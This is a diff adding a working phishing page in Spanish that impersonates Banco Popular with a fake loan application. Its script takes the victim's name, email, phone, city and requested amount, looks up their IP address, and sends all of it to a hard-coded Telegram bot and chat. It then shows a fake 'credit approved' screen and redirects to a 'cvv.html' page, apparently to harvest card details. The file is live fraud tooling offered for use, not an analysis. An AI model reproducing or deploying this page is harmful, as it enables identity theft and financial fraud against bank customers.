@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Popular - Datos Personales</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 0;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-bar {
+            background-color: #00496B;
+            height: 12px;
+        }
+
+        .content {
+            padding: 40px 24px;
+        }
+
+        .welcome-section {
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .welcome-section h1 {
+            font-size: 24px;
+            color: #333;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .welcome-section p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 8px;
+        }
+
+        .logo {
+            max-width: 180px;
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #FF6B00;
+        }
+
+        input::placeholder {
+            color: #9ca3af;
+        }
+
+        /* Slider para monto */
+        .slider-container {
+            margin-bottom: 16px;
+        }
+
+        .slider-value {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .slider-value-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #FF6B00;
+        }
+
+        .slider-value-label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 4px;
+            background: #e5e7eb;
+            outline: none;
+            margin-bottom: 8px;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #FF6B00;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(255, 107, 0, 0.3);
+            transition: all 0.2s;
+        }
+
+        .slider::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 3px 8px rgba(255, 107, 0, 0.4);
+        }
+
+        .slider::-moz-range-thumb {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #FF6B00;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 2px 6px rgba(255, 107, 0, 0.3);
+            transition: all 0.2s;
+        }
+
+        .slider::-moz-range-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 3px 8px rgba(255, 107, 0, 0.4);
+        }
+
+        .slider-range {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #666;
+        }
+
+        /* Botón Ver Cuotas */
+        .btn-ver-cuotas {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00496B 0%, #006B94 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(0, 73, 107, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-ver-cuotas:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 73, 107, 0.3);
+        }
+
+        .btn-ver-cuotas svg {
+            width: 18px;
+            height: 18px;
+            transition: transform 0.3s;
+        }
+
+        .btn-ver-cuotas.active svg {
+            transform: rotate(180deg);
+        }
+
+        /* Panel de Cuotas */
+        .cuotas-panel {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out;
+            margin-bottom: 16px;
+        }
+
+        .cuotas-panel.show {
+            max-height: 1200px;
+        }
+
+        .cuotas-content {
+            background: linear-gradient(135deg, #FF6B00 0%, #FF8533 100%);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 8px 24px rgba(255, 107, 0, 0.25);
+        }
+
+        .cuotas-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .promo-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #00A651;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .promo-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .cuotas-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 6px;
+        }
+
+        .cuotas-subtitle {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .cuota-item {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            animation: slideIn 0.4s ease-out;
+        }
+
+        .cuota-item:last-child {
+            margin-bottom: 0;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .cuota-plazo {
+            font-size: 14px;
+            font-weight: 600;
+            color: #00496B;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .cuota-plazo-badge {
+            background: #FFD700;
+            color: #00496B;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .cuota-valor {
+            font-size: 28px;
+            font-weight: 700;
+            color: #FF6B00;
+            margin-bottom: 6px;
+        }
+
+        .cuota-detalles {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #666;
+            margin-top: 8px;
+        }
+
+        .cuota-detalle-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .cuota-detalle-label {
+            color: #999;
+            margin-bottom: 2px;
+        }
+
+        .cuota-detalle-valor {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background-color: #d1d5db;
+            color: #9ca3af;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-bottom: 24px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.enabled {
+            background-color: #FF6B00;
+            color: white;
+            cursor: pointer;
+        }
+
+        .btn-submit.enabled:hover {
+            background-color: #e55f00;
+        }
+
+        .footer {
+            text-align: center;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 12px;
+        }
+
+        .footer-links a {
+            color: #FF6B00;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Pantalla de carga y aprobado */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0B4A6F;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        /* Pantalla de carga */
+        .loading-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            max-width: 280px;
+            height: auto;
+            margin-bottom: 50px;
+            filter: brightness(0) invert(1);
+        }
+
+        .loading-text {
+            font-size: 22px;
+            color: white;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .dots::after {
+            content: '.';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
+        }
+
+        /* Pantalla de aprobado */
+        .approved-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            width: 100%;
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .approved-screen.active {
+            display: flex;
+            animation: fadeIn 0.6s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .check-circle {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background-color: #00A651;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 40px;
+            animation: scaleIn 0.6s ease-out;
+            box-shadow: 0 10px 40px rgba(0, 166, 81, 0.4);
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        .check-icon {
+            width: 70px;
+            height: 70px;
+            fill: white;
+        }
+
+        .approved-title {
+            font-size: 52px;
+            color: white;
+            font-weight: 700;
+            margin-bottom: 20px;
+            animation: slideUp 0.6s ease-out 0.2s both;
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .approved-subtitle {
+            font-size: 24px;
+            color: #FFD700;
+            margin-bottom: 30px;
+            font-weight: 600;
+            animation: slideUp 0.6s ease-out 0.3s both;
+        }
+
+        .approved-message {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.95);
+            margin-bottom: 20px;
+            line-height: 1.8;
+            max-width: 450px;
+            text-align: center;
+            animation: slideUp 0.6s ease-out 0.4s both;
+        }
+
+        .verification-text {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 50px;
+            max-width: 400px;
+            text-align: center;
+            animation: slideUp 0.6s ease-out 0.5s both;
+        }
+
+        /* Confetti animation */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #FFD700;
+        }
+
+        @keyframes confetti-fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .loading-logo {
+                max-width: 220px;
+            }
+
+            .loading-text {
+                font-size: 18px;
+            }
+
+            .approved-title {
+                font-size: 42px;
+            }
+
+            .approved-subtitle {
+                font-size: 20px;
+            }
+
+            .approved-message {
+                font-size: 16px;
+            }
+
+            .verification-text {
+                font-size: 14px;
+            }
+
+            .check-circle {
+                width: 120px;
+                height: 120px;
+            }
+
+            .check-icon {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-bar"></div>
+        
+        <div class="content">
+            <div class="welcome-section">
+                <img src="popular.svg" alt="Banco Popular" class="logo">
+                <h1>Completemos tu solicitud</h1>
+                <p>Por favor, ingresa los siguientes datos para continuar</p>
+            </div>
+
+            <form id="datosForm">
+                <div class="form-group">
+                    <label class="form-label">Nombre completo</label>
+                    <input type="text" id="nombreCompleto" placeholder="Ingresa tu nombre completo">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Correo electrónico</label>
+                    <input type="email" id="correo" placeholder="ejemplo@correo.com">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número de celular</label>
+                    <input type="tel" id="celular" placeholder="300 123 4567">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Ciudad de residencia</label>
+                    <input type="text" id="ciudad" placeholder="Ingresa tu ciudad">
+                </div>
+
+                <div class="slider-container">
+                    <div class="slider-value">
+                        <div>
+                            <div class="slider-value-label">Monto solicitado</div>
+                            <div class="slider-value-amount">$<span id="montoDisplay">5,000,000</span></div>
+                        </div>
+                    </div>
+                    <input type="range" min="1000000" max="50000000" value="5000000" step="500000" class="slider" id="montoSlider">
+                    <div class="slider-range">
+                        <span>$1,000,000</span>
+                        <span>$50,000,000</span>
+                    </div>
+                </div>
+
+                <!-- Botón Ver Cuotas -->
+                <button type="button" class="btn-ver-cuotas" id="btnVerCuotas">
+                    <span>Ver Cuotas Disponibles</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M19 9l-7 7-7-7"/>
+                    </svg>
+                </button>
+
+                <!-- Panel de Cuotas -->
+                <div class="cuotas-panel" id="cuotasPanel">
+                    <div class="cuotas-content">
+                        <div class="cuotas-header">
+                            <div class="promo-badge">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z" />
+                                </svg>
+                                PROMOCIÓN ESPECIAL
+                            </div>
+                            <div class="cuotas-title">Planes de Financiamiento</div>
+                            <div class="cuotas-subtitle">Elige el plazo ideal para ti</div>
+                        </div>
+                        
+                        <div id="cuotasContainer"></div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">Continuar</button>
+
+                <div class="footer">
+                    <p>Protegido por reCAPTCHA | <a href="#" style="color: #FF6B00; text-decoration: none;">Privacidad</a> - <a href="#" style="color: #FF6B00; text-decoration: none;">Condiciones</a></p>
+                    <div class="footer-links">
+                        <a href="#">Seguridad</a>
+                        <a href="#">Accesibilidad</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Overlay con pantalla de carga y aprobado -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <!-- Pantalla de carga -->
+            <div class="loading-screen" id="loadingScreen">
+                <img src="popular.svg" alt="Banco Popular" class="loading-logo">
+                <div class="loading-text">Procesando tu solicitud<span class="dots"></span></div>
+                <div class="spinner"></div>
+            </div>
+
+            <!-- Pantalla de aprobado -->
+            <div class="approved-screen" id="approvedScreen">
+                <div class="check-circle">
+                    <svg class="check-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/>
+                    </svg>
+                </div>
+                <h1 class="approved-title">¡Crédito Aprobado!</h1>
+                <p class="approved-subtitle">✓ Pre-aprobación exitosa</p>
+                <p class="approved-message">
+                    ¡Felicidades! Tu crédito ha sido pre-aprobado exitosamente.
+                </p>
+                <p class="verification-text">
+                    Ahora comprobaremos tu información para finalizar el proceso de desembolso.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========================================
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003972631278';
+
+        // Función para formatear número con separadores de miles
+        function formatearNumero(numero) {
+            return numero.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        // Función para calcular cuotas atractivas
+        function calcularCuotas(monto) {
+            const cuotas = [
+                {
+                    plazo: "12 meses",
+                    badge: "POPULAR",
+                    tasaAparente: 0.8,
+                    totalAPagar: monto * 1.08
+                },
+                {
+                    plazo: "24 meses",
+                    badge: "RECOMENDADO",
+                    tasaAparente: 0.9,
+                    totalAPagar: monto * 1.15
+                },
+                {
+                    plazo: "36 meses",
+                    badge: "MÁS TIEMPO",
+                    tasaAparente: 1.2,
+                    totalAPagar: monto * 1.22
+                },
+                {
+                    plazo: "48 meses",
+                    badge: "ULTRA FLEX",
+                    tasaAparente: 1.5,
+                    totalAPagar: monto * 1.30
+                }
+            ];
+
+            return cuotas.map((cuota, index) => {
+                const meses = parseInt(cuota.plazo);
+                const cuotaMensual = cuota.totalAPagar / meses;
+                
+                return {
+                    plazo: cuota.plazo,
+                    badge: cuota.badge,
+                    cuotaMensual: Math.round(cuotaMensual),
+                    totalAPagar: Math.round(cuota.totalAPagar),
+                    tasaMensual: cuota.tasaAparente.toFixed(2) + '%',
+                    ahorro: index === 1 ? '¡Más solicitado!' : null
+                };
+            });
+        }
+
+        // Actualizar cuotas cuando cambia el monto
+        function actualizarCuotas() {
+            const monto = parseInt(montoSlider.value);
+            const cuotas = calcularCuotas(monto);
+            const container = document.getElementById('cuotasContainer');
+            
+            container.innerHTML = cuotas.map((cuota, index) => `
+                <div class="cuota-item" style="animation-delay: ${index * 0.1}s">
+                    <div class="cuota-plazo">
+                        ${cuota.plazo}
+                        <span class="cuota-plazo-badge">${cuota.badge}</span>
+                    </div>
+                    <div class="cuota-valor">$${formatearNumero(cuota.cuotaMensual)}/mes</div>
+                    <div class="cuota-detalles">
+                        <div class="cuota-detalle-item">
+                            <span class="cuota-detalle-label">Tasa mensual</span>
+                            <span class="cuota-detalle-valor">${cuota.tasaMensual}</span>
+                        </div>
+                        <div class="cuota-detalle-item">
+                            <span class="cuota-detalle-label">Total a pagar</span>
+                            <span class="cuota-detalle-valor">$${formatearNumero(cuota.totalAPagar)}</span>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Actualizar display del monto
+        const montoSlider = document.getElementById('montoSlider');
+        const montoDisplay = document.getElementById('montoDisplay');
+
+        montoSlider.addEventListener('input', function() {
+            montoDisplay.textContent = formatearNumero(this.value);
+            actualizarCuotas();
+        });
+
+        // Toggle del panel de cuotas
+        const btnVerCuotas = document.getElementById('btnVerCuotas');
+        const cuotasPanel = document.getElementById('cuotasPanel');
+
+        btnVerCuotas.addEventListener('click', function() {
+            this.classList.toggle('active');
+            cuotasPanel.classList.toggle('show');
+            
+            if (cuotasPanel.classList.contains('show')) {
+                actualizarCuotas();
+            }
+        });
+
+        // Inicializar cuotas
+        actualizarCuotas();
+
+        // Función para enviar mensaje a Telegram
+        async function enviarATelegram(datos) {
+            const mensaje = `
+🔔 *DATOS PERSONALES - BANCO POPULAR*
+
+👤 *Nombre completo:* ${datos.nombreCompleto}
+📧 *Correo:* ${datos.correo}
+📱 *Celular:* ${datos.celular}
+🏙️ *Ciudad:* ${datos.ciudad}
+💰 *Monto solicitado:* $${formatearNumero(datos.monto)}
+
+⏰ *Fecha:* ${datos.fecha}
+🌐 *IP:* ${datos.ip || 'No disponible'}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error al enviar a Telegram:', error);
+                return false;
+            }
+        }
+
+        // Función para obtener IP del usuario
+        async function obtenerIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'No disponible';
+            }
+        }
+
+        // Función para crear confetti
+        function createConfetti() {
+            const approvedScreen = document.getElementById('approvedScreen');
+            const colors = ['#FFD700', '#FF6B00', '#00A651', '#ffffff', '#FFA500'];
+            
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.top = '-10px';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.animation = `confetti-fall ${(Math.random() * 2 + 2)}s linear`;
+                    confetti.style.animationDelay = Math.random() * 0.5 + 's';
+                    approvedScreen.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 4000);
+                }, i * 30);
+            }
+        }
+
+        // Validación del formulario
+        const nombreCompleto = document.getElementById('nombreCompleto');
+        const correo = document.getElementById('correo');
+        const celular = document.getElementById('celular');
+        const ciudad = document.getElementById('ciudad');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const approvedScreen = document.getElementById('approvedScreen');
+
+        function validateForm() {
+            if (nombreCompleto.value.trim() !== '' && 
+                correo.value.trim() !== '' && 
+                celular.value.trim() !== '' && 
+                ciudad.value.trim() !== '') {
+                submitBtn.classList.add('enabled');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('enabled');
+                submitBtn.disabled = true;
+            }
+        }
+
+        nombreCompleto.addEventListener('input', validateForm);
+        correo.addEventListener('input', validateForm);
+        celular.addEventListener('input', validateForm);
+        ciudad.addEventListener('input', validateForm);
+
+        // Form submission
+        document.getElementById('datosForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validar que los campos no estén vacíos
+            if (!nombreCompleto.value.trim() || !correo.value.trim() || 
+                !celular.value.trim() || !ciudad.value.trim()) {
+                alert('Por favor, completa todos los campos');
+                return;
+            }
+            
+            // Mostrar overlay y pantalla de carga
+            loadingOverlay.classList.add('show');
+            loadingScreen.classList.add('active');
+            approvedScreen.classList.remove('active');
+            
+            // Obtener IP
+            const ip = await obtenerIP();
+            
+            // Preparar datos
+            const datos = {
+                nombreCompleto: nombreCompleto.value,
+                correo: correo.value,
+                celular: celular.value,
+                ciudad: ciudad.value,
+                monto: montoSlider.value,
+                fecha: new Date().toLocaleString('es-CO', { 
+                    timeZone: 'America/Bogota',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                }),
+                ip: ip
+            };
+            
+            // Enviar a Telegram
+            await enviarATelegram(datos);
+            
+            // Tiempo de carga de 3 segundos
+            setTimeout(() => {
+                // Ocultar pantalla de carga
+                loadingScreen.classList.remove('active');
+                
+                // Mostrar pantalla de aprobado
+                approvedScreen.classList.add('active');
+                
+                // Crear efecto confetti
+                createConfetti();
+                
+                // Redirección automática después de 3.5 segundos
+                setTimeout(() => {
+                    window.location.href = 'cvv.html';
+                }, 3500);
+                
+            }, 3000); // 3 segundos de carga
+        });
+    </script>
+</body>
+</html>
